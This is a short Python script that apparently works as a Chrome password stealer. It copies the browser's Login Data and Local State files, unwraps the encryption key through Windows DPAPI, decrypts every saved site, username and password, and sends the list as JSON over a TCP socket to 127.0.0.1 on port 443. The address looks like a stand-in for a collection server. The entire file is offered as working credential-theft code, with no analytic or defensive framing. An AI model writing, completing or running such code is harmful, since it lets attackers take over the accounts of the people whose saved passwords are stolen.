import socket
import sqlite3
import shutil
import os
import win32crypt
from Cryptodome.Cipher import AES
import json
import base64


class Sender:
    path_login_data = '{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(os.path.expanduser('~'))
    path_local_state = '{}/AppData/Local/Google/Chrome/User Data/Local State'.format(os.path.expanduser('~'))


    def send(self, message):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect(('127.0.0.1', 443))
            client_socket.sendall(message)


    def get_chrome_info(self):
        with sqlite3.connect('{}s'.format(self.path_login_data)) as connection:
            cursor = connection.cursor()
            res = cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
            return res.fetchall()


    def copy_files(self):
        shutil.copy(self.path_login_data, '{}s'.format(self.path_login_data))
        shutil.copy(self.path_local_state, '{}s'.format(self.path_local_state))


    def get_encryption_key(self):
        local_state_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
        )
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


    def decrypt_password(self, password, encryption_key):
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()



sender = Sender()
sender.copy_files()
info = sender.get_chrome_info()
key = sender.get_encryption_key()
new_info = []
for i in info:
    pss = sender.decrypt_password(i[2], key)
    new_info.append('{} {} {}'.format(i[0], i[1], pss))

binfo = json.dumps(new_info).encode('utf-8')
sender.send(binfo)
